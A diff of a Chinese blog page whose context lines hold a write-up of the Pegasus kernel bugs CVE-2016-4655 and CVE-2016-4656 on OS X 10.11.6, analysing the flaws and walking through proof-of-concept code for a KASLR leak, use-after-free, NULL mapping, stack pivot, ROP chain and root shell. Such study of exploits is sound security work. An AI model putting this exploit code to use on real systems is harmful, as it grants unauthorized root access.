@@ -17,23 +17,23 @@
   
   <title>Pegasus内核漏洞及PoC分析 | 4ch12dy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 写在前面
- 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2">
+  <meta name="description" content="0x00 写在前面#
+ 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析">
 <meta name="keywords">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Pegasus内核漏洞及PoC分析">
 <meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析.html">
 <meta property="og:site_name" content="4ch12dy">
-<meta property="og:description" content="0x00 写在前面
- 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2">
+<meta property="og:description" content="0x00 写在前面#
+ 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析">
 <meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png">
 <meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png">
 <meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-2.png">
 <meta property="og:updated_time" content="2017-05-01T11:59:39.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pegasus内核漏洞及PoC分析">
-<meta name="twitter:description" content="0x00 写在前面
- 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2">
+<meta name="twitter:description" content="0x00 写在前面#
+ 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析">
 <meta name="twitter:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
@@ -176,16 +176,16 @@
             
         </div>
         <div class="content" style="overflow: auto">
-            <h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote>
+            <h2><span id="0x00-xie-zai-qian-mian">0x00 写在前面</span><a href="#0x00-xie-zai-qian-mian" class="header-anchor">#</a></h2><blockquote>
 <p> 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X<br> 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google<br> 1.<a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a><br> 2.<a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC</a><br> 3.<a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析</a></p>
 </blockquote>
-<h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><ol>
+<h2><span id="0x01-mu-lu">0x01 目录</span><a href="#0x01-mu-lu" class="header-anchor">#</a></h2><ol>
 <li><code>OSUnserializeBinary</code>概述</li>
 <li>漏洞分析-CVE-2016-4655，CVE-2016-4656</li>
 <li>漏洞利用-PoC分析</li>
 <li>总结</li>
 </ol>
-<h2 id="0x02-OSUnserializeBinary概述"><a href="#0x02-OSUnserializeBinary概述" class="headerlink" title="0x02 OSUnserializeBinary概述"></a>0x02 <code>OSUnserializeBinary</code>概述</h2><ol>
+<h2><span id="0x02-osunserializebinary-gai-shu">0x02 <code>OSUnserializeBinary</code>概述</span><a href="#0x02-osunserializebinary-gai-shu" class="header-anchor">#</a></h2><ol>
 <li><p>序列化与反序列化<br>在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。<br>在XNU内核也有一个实现，<code>OSUnserializeXML</code>(将xml格式转化为内核数据对象)和<code>OSUnserializeBinary</code>(将二进制格式转化为内核数据对象)</p>
 </li>
 <li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p>
@@ -398,8 +398,8 @@ enum {
             }
         }
 </code></pre><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p>
-<h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p>
-<h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p>
+<h2><span id="0x03-lou-dong-fen-xi-cve-2016-4655-cve-2016-4656">0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</span><a href="#0x03-lou-dong-fen-xi-cve-2016-4655-cve-2016-4656" class="header-anchor">#</a></h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p>
+<h3><span id="cve-2016-4655-infoleak">CVE-2016-4655-infoleak</span><a href="#cve-2016-4655-infoleak" class="header-anchor">#</a></h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p>
 <p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case:</p>
 <pre><code>case kOSSerializeNumber:
     bufferPos += sizeof(long long);
@@ -411,7 +411,7 @@ enum {
     next += 2;
     break;
 </code></pre><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p>
-<h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>  </p>
+<h3><span id="cve-2016-4656-uaf-lou-dong">CVE-2016-4656-UAF漏洞</span><a href="#cve-2016-4656-uaf-lou-dong" class="header-anchor">#</a></h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>  </p>
 <pre><code>if (dict)
 {
         if (sym)
@@ -438,8 +438,8 @@ enum {
     isRef = true;
     break;
 </code></pre><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p>
-<h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p>
-<h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p>
+<h2><span id="0x04-lou-dong-li-yong-poc-fen-xi">0x04 漏洞利用-PoC分析</span><a href="#0x04-lou-dong-li-yong-poc-fen-xi" class="header-anchor">#</a></h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p>
+<h3><span id="cve-2016-4655-infoleak-lou-dong-li-yong">CVE-2016-4655-infoleak漏洞利用</span><a href="#cve-2016-4655-infoleak-lou-dong-li-yong" class="header-anchor">#</a></h3><p>infoleak漏洞利用步骤：</p>
 <ul>
 <li>构造一个包含过长的<code>OSNumber</code>dic字典</li>
 <li>用这个序列化字典去设置userclient对象的属性</li>
@@ -515,7 +515,7 @@ enum {
 
     return kslide;
 }
-</code></pre><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><pre><code>void *dict = calloc(1, 512);
+</code></pre><h4><span id="gou-zao-zi-dian">构造字典</span><a href="#gou-zao-zi-dian" class="header-anchor">#</a></h4><pre><code>void *dict = calloc(1, 512);
 uint32_t idx = 0; // index into our data
 
 #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
@@ -544,7 +544,7 @@ if (kr == KERN_SUCCESS) {
 } else
     return -1;
 </code></pre><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p>
-<h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p>
+<h4><span id="sheng-cheng-userclient-she-ding-shu-xing">生成UserClient设定属性</span><a href="#sheng-cheng-userclient-she-ding-shu-xing" class="header-anchor">#</a></h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p>
 <pre><code>serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));
 
 kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);
@@ -556,7 +556,7 @@ if (kr == KERN_SUCCESS) {
 <pre><code>IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);
 io_object_t object = IOIteratorNext(iter);
 </code></pre><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p>
-<h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><pre><code>char buf[0x200] = {0};
+<h4><span id="du-qu-shu-xing-hong-fa-info-leak">读取属性，触发info-leak</span><a href="#du-qu-shu-xing-hong-fa-info-leak" class="header-anchor">#</a></h4><pre><code>char buf[0x200] = {0};
 mach_msg_type_number_t bufCnt = 0x200;
 
 kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);
@@ -666,7 +666,7 @@ else if( (off = OSDynamicCast( OSNumber, obj ))) {
     }
 }
 </code></pre><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p>
-<h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p>
+<h4><span id="ji-suan-nei-he-pian-yi">计算内核偏移</span><a href="#ji-suan-nei-he-pian-yi" class="header-anchor">#</a></h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p>
 <p><img src="/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png" alt="0-0"></p>
 <p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p>
 <pre><code>0xffffff80037934bf - 0xffffff80003934bf = 0x3400000
@@ -677,7 +677,7 @@ kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
 
 printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
 </code></pre><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p>
-<h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p>
+<h3><span id="cve-2016-4656-uaf-lou-dong-li-yong">CVE-2016-4656-UAF漏洞利用</span><a href="#cve-2016-4656-uaf-lou-dong-li-yong" class="header-anchor">#</a></h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p>
 <ul>
 <li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li>
 <li>Map NULL</li>
@@ -785,7 +785,7 @@ printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
         return;
 }
 </code></pre><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p>
-<h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p>
+<h4><span id="gou-zao-zi-dian">构造字典</span><a href="#gou-zao-zi-dian" class="header-anchor">#</a></h4><p>将如下构造  </p>
 <pre><code>&lt;dict&gt;
     &lt;string&gt;AAA&lt;/string&gt;
     &lt;boolean&gt;true&lt;/boolean&gt;
@@ -799,7 +799,7 @@ printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
     &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;
 &lt;/dict&gt;
 </code></pre><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p>
-<h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p>
+<h4><span id="map-null">Map NULL</span><a href="#map-null" class="header-anchor">#</a></h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p>
 <pre><code>mach_vm_address_t null_map = 0;
 
 vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);
@@ -808,7 +808,7 @@ kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);
 if (kr != KERN_SUCCESS)
     return;
 </code></pre><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p>
-<h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p>
+<h3><span id="pivoting-stack-he-rop-lian">Pivoting stack和ROP链</span><a href="#pivoting-stack-he-rop-lian" class="header-anchor">#</a></h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p>
 <pre><code>*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot
 </code></pre><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p>
 <pre><code>uint64_t *transfer = (uint64_t *)0x0;
@@ -851,7 +851,7 @@ if (kr != KERN_SUCCESS)
     system(&quot;/bin/bash&quot;);
 }
 </code></pre><p>测试：<br><img src="/4ch12dy/4ch12dy.github.io.git/articlePic/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-2.png" alt="0-2"></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>没有会意便欣然忘食</strong></p>
+<h2><span id="0x04-zong-jie">0x04 总结</span><a href="#0x04-zong-jie" class="header-anchor">#</a></h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>没有会意便欣然忘食</strong></p>
 <p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p>
 <p><strong>特别感谢</strong></p>
 <ul>
